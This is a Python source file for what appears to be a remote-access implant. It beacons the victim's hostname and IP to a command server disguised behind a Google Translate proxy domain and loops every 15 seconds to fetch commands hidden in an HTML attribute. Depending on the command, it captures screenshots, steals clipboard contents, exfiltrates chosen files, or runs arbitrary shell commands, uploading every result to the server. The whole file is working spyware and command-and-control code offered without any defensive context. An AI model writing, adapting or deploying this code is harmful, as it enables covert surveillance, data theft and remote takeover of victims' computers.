from src import upload,screenshot,clipboard,files,command,get_ip
from bs4 import BeautifulSoup
import socket
import random, string
import requests
import time

HOSTNAME=socket.gethostname()
IP=get_ip.get()
BASE_URL = "https://your-domain.translate.goog"

def random_string(length):
	letters=string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(length))

ack_url="{}/{}/{}/Status/ON".format(BASE_URL,HOSTNAME,IP)
requests.get(ack_url)

while True:
    get_cmd="{}/c/{}/{}/{}?_x_tr_sl=en&_x_tr_tl=fr&_x_tr_hl=fr&_x_tr_pto=wapp".format(BASE_URL,HOSTNAME,IP,random_string(30))
    html_doc=requests.get(get_cmd).content.decode()
    soup = BeautifulSoup(html_doc, 'html.parser')
    args=soup.find(alt="screen3").get('class')
    if args:
        if args[0]=="screenshot":
            (md5,data)=screenshot.take_screenshot()
            upload.upload_data(BASE_URL,HOSTNAME,IP,"Screenshot",data,md5)
        elif args[0]=="clipboard":
            data=clipboard.get_clipboard()
            upload.upload_data(BASE_URL,HOSTNAME,IP,"Clipboard",data)
        elif args[0]=="download":
            (md5,data,filetype)=files.exfiltrate_file(args[1])
            if data:
                if filetype == "":
                    filetype="FILE"
                upload.upload_data(BASE_URL,HOSTNAME,IP,filetype,data,md5)
        elif len(args[0])>0:
            data=command.execute_cmd(args)
            if data!="":
                upload.upload_data(BASE_URL,HOSTNAME,IP,"Command",data)
    time.sleep(15)
